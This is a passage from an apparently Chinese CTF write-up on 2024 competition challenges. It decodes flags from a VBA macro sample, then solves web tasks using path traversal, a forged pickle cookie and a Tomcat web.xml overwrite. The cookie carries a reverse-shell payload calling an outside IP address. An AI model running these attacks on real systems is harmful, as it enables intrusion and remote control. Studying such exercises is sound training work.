class="hljs-number">4.38138</span>,<br>  -<span class="hljs-number">19.3898</span>,<br>  <span class="hljs-number">18.3453</span>,<br>  <span class="hljs-number">6.88259</span>,<br>  -<span class="hljs-number">14.7652</span>,<br>  <span class="hljs-number">14.6102</span>,<br>  <span class="hljs-number">24.7414</span>,<br>  -<span class="hljs-number">11.6222</span>,<br>  -<span class="hljs-number">9.754759999999999</span>,<br>  <span class="hljs-number">12.2424</span>,<br>  <span class="hljs-number">13.4343</span>,<br>  -<span class="hljs-number">34.9307</span>,<br>  -<span class="hljs-number">35.735</span>,<br>  -<span class="hljs-number">20.0848</span>,<br>  <span class="hljs-number">39.689</span>,<br>  <span class="hljs-number">21.879</span>,<br>  <span class="hljs-number">26.8296</span>]<br><br>decrypted_message = decrypt_to_ascii(encrypted_data)<br><br><span class="hljs-built_in">print</span>(decrypted_message)<br><span class="hljs-comment">#QNFPGS&#123;Ju0_1f_Zn1a_@aq_ShaaL_Qpg&#125;</span><br></code></pre></td></tr></table></figure><p>在进行一次rot13</p><p><code>DASCTF&#123;Wh0_1s_Ma1n_@nd_FunnY_Dct&#125;</code></p><h2 id="docCrack"><a href="#docCrack" class="headerlink" title="docCrack"></a>docCrack</h2><p>用微步云沙箱进行分析，可以看到 vba 宏代码，且释放了一个二进制文件</p><p><img src="/img/wp/2024/2024-ycb-c-docCrack-1.png"></p><p>通过样本提取把最后一个释放的 temp 文件进行提取，再进行 base64 解密后，就是一个二进制文件，且加密就一处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; (<span class="hljs-type">int</span>)j_strlen(argv[<span class="hljs-number">1</span>]) &amp;&amp; (<span class="hljs-type">unsigned</span> __int64)j &lt; <span class="hljs-number">0x36</span>; ++j )<br>      v10[j + <span class="hljs-number">64</span>] = argv[<span class="hljs-number">1</span>][j] &lt;&lt; <span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><p>在 vba 宏代码处，还存在一个加密</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(inflag) res = Chr(Asc(<span class="hljs-keyword">Mid</span>(inflag, i, <span class="hljs-number">1</span>)) <span class="hljs-built_in">Xor</span> <span class="hljs-number">7</span>) Result = Result<br></code></pre></td></tr></table></figure><p>直接提取密文解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python">v10 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">54</span>))<br>v10[<span class="hljs-number">0</span>] = <span class="hljs-number">4288</span>;<br>v10[<span class="hljs-number">1</span>] = <span class="hljs-number">4480</span>;<br>v10[<span class="hljs-number">2</span>] = <span class="hljs-number">5376</span>;<br>v10[<span class="hljs-number">3</span>] = <span class="hljs-number">4352</span>;<br>v10[<span class="hljs-number">4</span>] = <span class="hljs-number">5312</span>;<br>v10[<span class="hljs-number">5</span>] = <span class="hljs-number">4160</span>;<br>v10[<span class="hljs-number">6</span>] = <span class="hljs-number">7936</span>;<br>v10[<span class="hljs-number">7</span>] = <span class="hljs-number">5184</span>;<br>v10[<span class="hljs-number">8</span>] = <span class="hljs-number">6464</span>;<br>v10[<span class="hljs-number">9</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">10</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">11</span>] = <span class="hljs-number">3456</span>;<br>v10[<span class="hljs-number">12</span>] = <span class="hljs-number">7424</span>;<br>v10[<span class="hljs-number">13</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">14</span>] = <span class="hljs-number">6336</span>;<br>v10[<span class="hljs-number">15</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">16</span>] = <span class="hljs-number">6720</span>;<br>v10[<span class="hljs-number">17</span>] = <span class="hljs-number">6144</span>;<br>v10[<span class="hljs-number">18</span>] = <span class="hljs-number">6272</span>;<br>v10[<span class="hljs-number">19</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">20</span>] = <span class="hljs-number">6656</span>;<br>v10[<span class="hljs-number">21</span>] = <span class="hljs-number">7296</span>;<br>v10[<span class="hljs-number">22</span>] = <span class="hljs-number">7424</span>;<br>v10[<span class="hljs-number">23</span>] = <span class="hljs-number">2432</span>;<br>v10[<span class="hljs-number">24</span>] = <span class="hljs-number">2432</span>;<br>v10[<span class="hljs-number">25</span>] = <span class="hljs-number">2432</span>;<br>v10[<span class="hljs-number">26</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">27</span>] = <span class="hljs-number">4416</span>;<br>v10[<span class="hljs-number">28</span>] = <span class="hljs-number">3456</span>;<br>v10[<span class="hljs-number">29</span>] = <span class="hljs-number">7168</span>;<br>v10[<span class="hljs-number">30</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">31</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">32</span>] = <span class="hljs-number">6272</span>;<br>v10[<span class="hljs-number">33</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">34</span>] = <span class="hljs-number">3520</span>;<br>v10[<span class="hljs-number">35</span>] = <span class="hljs-number">6208</span>;<br>v10[<span class="hljs-number">36</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">37</span>] = <span class="hljs-number">4736</span>;<br>v10[<span class="hljs-number">38</span>] = <span class="hljs-number">6528</span>;<br>v10[<span class="hljs-number">39</span>] = <span class="hljs-number">6400</span>;<br>v10[<span class="hljs-number">40</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">41</span>] = <span class="hljs-number">3520</span>;<br>v10[<span class="hljs-number">42</span>] = <span class="hljs-number">5632</span>;<br>v10[<span class="hljs-number">43</span>] = <span class="hljs-number">5184</span>;<br>v10[<span class="hljs-number">44</span>] = <span class="hljs-number">3456</span>;<br>v10[<span class="hljs-number">45</span>] = <span class="hljs-number">7488</span>;<br>v10[<span class="hljs-number">46</span>] = <span class="hljs-number">7296</span>;<br>v10[<span class="hljs-number">47</span>] = <span class="hljs-number">3200</span>;<br>v10[<span class="hljs-number">48</span>] = <span class="hljs-number">6272</span>;<br>v10[<span class="hljs-number">49</span>] = <span class="hljs-number">0x1D00</span>;<br>v10[<span class="hljs-number">50</span>] = <span class="hljs-number">0x980</span>;<br>v10[<span class="hljs-number">51</span>] = <span class="hljs-number">0x980</span>;<br>v10[<span class="hljs-number">52</span>] = <span class="hljs-number">0x980</span>;<br>v10[<span class="hljs-number">53</span>] = <span class="hljs-number">0x1E80</span>;<br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(v10):<br>    value=v;<br>    value = <span class="hljs-built_in">chr</span>((value &gt;&gt; <span class="hljs-number">6</span>)^<span class="hljs-number">7</span>)<br>    <span class="hljs-built_in">print</span>(value, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!&#125;</code></p><h1 id="初赛-web"><a href="#初赛-web" class="headerlink" title="[初赛] web"></a>[初赛] web</h1><h2 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h2><p><code>lyrics?lyrics=../app.py</code></p><p>任意文件读取得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response, request, render_template<br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie<br><span class="hljs-keyword">import</span> pickle<br><br>app = Flask(__name__)<br>app.secret_key = random.randbytes(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username</span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Waf</span>(<span class="hljs-params">data</span>):<br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word.lower() <span class="hljs-keyword">in</span> data.lower():<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> valid<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/lyrics&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lyrics</span>():<br>    resp = make_response()<br>    resp.headers[<span class="hljs-string">&quot;Content-Type&quot;</span>] = <span class="hljs-string">&#x27;text/plain; charset=UTF-8&#x27;</span><br>    query = request.args.get(<span class="hljs-string">&quot;lyrics&quot;</span>)<br>    path = os.path.join(os.getcwd() + <span class="hljs-string">&quot;/lyrics&quot;</span>, query)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path) <span class="hljs-keyword">as</span> f:<br>            res = f.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No lyrics found&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        user = UserData(username)<br>        res = &#123;<span class="hljs-string">&quot;username&quot;</span>: user.username&#125;<br>        <span class="hljs-keyword">return</span> set_cookie(<span class="hljs-string">&quot;user&quot;</span>, res, secret=secret_code)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/board&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">board</span>():<br>    invalid = cookie_check(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br>    <span class="hljs-keyword">if</span> invalid:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope, invalid code get out!&quot;</span><br><br>    data = get_cookie(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):<br>        a = pickle.loads(data)<br>        data = <span class="hljs-built_in">str</span>(data, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=<span class="hljs-string">&quot;guest&quot;</span>)<br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;username&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;username&quot;</span>] != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.chdir(os.path.dirname(__file__))<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>导入了<code>config.secret_key</code>和<code>cookie</code>，通过任意文件读取再次拿到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">secret_code = <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response, request<br><br>unicode = <span class="hljs-built_in">str</span><br>basestring = <span class="hljs-built_in">str</span><br><br><br><span class="hljs-comment"># Quoted from python bottle template, thanks :D</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_encode</span>(<span class="hljs-params">data, key</span>):<br>    msg = base64.b64encode(pickle.dumps(data, -<span class="hljs-number">1</span>))<br>    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())<br>    <span class="hljs-keyword">return</span> tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + msg<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_decode</span>(<span class="hljs-params">data, key</span>):<br>    data = tob(data)<br>    <span class="hljs-keyword">if</span> cookie_is_encoded(data):<br>        sig, msg = data.split(tob(<span class="hljs-string">&#x27;?&#x27;</span>), <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> _lscmp(sig[<span class="hljs-number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):<br>            <span class="hljs-keyword">return</span> pickle.loads(base64.b64decode(msg))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> data:<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-comment"># print(word)</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> valid<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_check</span>(<span class="hljs-params">key, secret=<span class="hljs-literal">None</span></span>):<br>    a = request.cookies.get(key)<br>    data = tob(request.cookies.get(key))<br>    <span class="hljs-keyword">if</span> data:<br>        <span class="hljs-keyword">if</span> cookie_is_encoded(data):<br>            sig, msg = data.split(tob(<span class="hljs-string">&#x27;?&#x27;</span>), <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> _lscmp(sig[<span class="hljs-number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):<br>                res = base64.b64decode(msg)<br>                <span class="hljs-keyword">if</span> waf(res):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tob</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> s.encode(enc) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, unicode) <span class="hljs-keyword">else</span> <span class="hljs-built_in">bytes</span>(s)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span></span>):<br>    value = request.cookies.get(key)<br>    <span class="hljs-keyword">if</span> secret <span class="hljs-keyword">and</span> value:<br>        dec = cookie_decode(value, secret)<br>        <span class="hljs-keyword">return</span> dec[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> dec <span class="hljs-keyword">and</span> dec[<span class="hljs-number">0</span>] == key <span class="hljs-keyword">else</span> default<br>    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_is_encoded</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(data.startswith(tob(<span class="hljs-string">&#x27;!&#x27;</span>)) <span class="hljs-keyword">and</span> tob(<span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">in</span> data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_lscmp</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">sum</span>(<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x == y <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b)) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-built_in">len</span>(b)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cookie</span>(<span class="hljs-params">name, value, secret=<span class="hljs-literal">None</span>, **options</span>):<br>    <span class="hljs-keyword">if</span> secret:<br>        value = touni(cookie_encode((name, value), secret))<br>        resp = make_response(<span class="hljs-string">&quot;success&quot;</span>)<br>        resp.set_cookie(<span class="hljs-string">&quot;user&quot;</span>, value, max_age=<span class="hljs-number">3600</span>)<br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">4096</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;Cookie value to long.&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touni</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span>, err=<span class="hljs-string">&#x27;strict&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> s.decode(enc, err) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> unicode(s)<br></code></pre></td></tr></table></figure><p>其中<code>/board</code>路由会读取cookie，并进行一次<code>pickle.loads</code></p><p>在本地制作一个cookie后复制到靶机即可实现pickle反序列化</p><p>waf很宽松，约等于没有，使用i执行反弹shell即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cookie<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>secret_code = <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span><br>app = Flask(__name__)<br>payload = <span class="hljs-string">b&#x27;&#x27;&#x27;(S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> cookie.set_cookie(<span class="hljs-string">&quot;user&quot;</span>, payload, secret=secret_code)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-Lyrics-For-You-1.png"></p><h2 id="tomtom2"><a href="#tomtom2" class="headerlink" title="tomtom2"></a>tomtom2</h2><p>题目给了一个只能读xml文件的接口</p><p>那就去读tomcat的配置文件</p><p><code>/myapp/read?filename=conf/tomcat-users.xml</code></p><p>tomcat-users中存在后台账号密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;This_is_my_favorite_passwd&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>登录后有一个文件上传，测试后发现只能上传xml文件，同时上传的<code>path</code>参数是可控的</p><p>那么可以覆盖靶机的<code>WEB-INF/web.xml</code>文件来自定义一个Servlet</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">    